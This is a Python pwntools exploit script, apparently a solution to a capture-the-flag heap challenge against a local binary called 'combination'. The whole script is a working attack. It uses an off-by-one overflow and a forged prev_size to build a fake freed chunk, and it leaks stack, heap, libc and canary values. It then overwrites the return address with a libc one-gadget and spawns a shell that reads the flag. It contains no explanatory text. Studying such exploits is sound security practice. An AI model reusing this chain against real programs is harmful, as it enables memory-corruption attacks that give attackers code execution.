from pwn import *

s = process('./combination')
e = ELF('./combination')

def to_main():
	s.recvuntil('> ')

def malloc(size, data):
	s.sendline('1')
	s.recvuntil('Enter size : ')
	s.sendline(size)
	s.recvuntil('Enter data : ')
	s.sendline(data)
	to_main()

def free(index):
	s.sendline('2')
	s.recvuntil('Which one do you want to free : ')
	s.sendline(index)
	to_main()

def list(index, dummy, canary=0):
	s.sendline('3')
	s.recvuntil('Which chunk do you wanna see? ')
	s.sendline(index)
	s.recvuntil(dummy)
	sleep(0.1)
	if canary == '1':
		leak = u64(s.recv(8))
	else :
		leak = u64(s.recv(6)+'\x00'*2)
	s.recv()
	return leak

def modify(index, data):
	s.sendline('4')
	s.recvuntil('Which chunk do you want to modify : ')
	s.sendline(index)
	s.recvuntil('Enter data : ')
	s.sendline(data)
	to_main()	

def alloca(size, data):
	s.sendline('46')
	s.sendline(size)
	s.sendline(data)	
	to_main()

def exit():
	s.sendline('5')

to_main()
malloc("504", "A") # index 1
malloc("504", "B") # index 2

modify("1", "A"*504) # off-by-one overflow

alloca("112", "A"*32) # index 3
stack_leaked = list("3", "A"*32) - 368

alloca("512", "A"*209) # index 4
heap_leaked = list("4", "A"*208) - 0x41 + 0x200 # 

alloca("512", "A"*184) # index 5
libc_leaked = list("5", "A"*184) - 15744
oneshot = libc_leaked + 0x4526a

prev_size = 0x10000000000000000 + heap_leaked - stack_leaked

modify("1", "A"*496 + p64(prev_size)) # overflow B -> prev_size
modify("3", p64(0x0) + p64(prev_size) + p64(stack_leaked)*4) # make it freed_fake_chunk

free("2")
modify("3", p64(0x0) + p64(0x1000)) # change fake_chunk size

malloc("300", "A"*121) # index 6
canary_leaked = list("6", "A"*120, "1") - 0x41 

modify("6", p64(0)*15 + p64(canary_leaked) + p64(oneshot)*2+p64(0)*16)
exit()

s.sendline("id")
s.sendline("cat flag")
s.interactive()
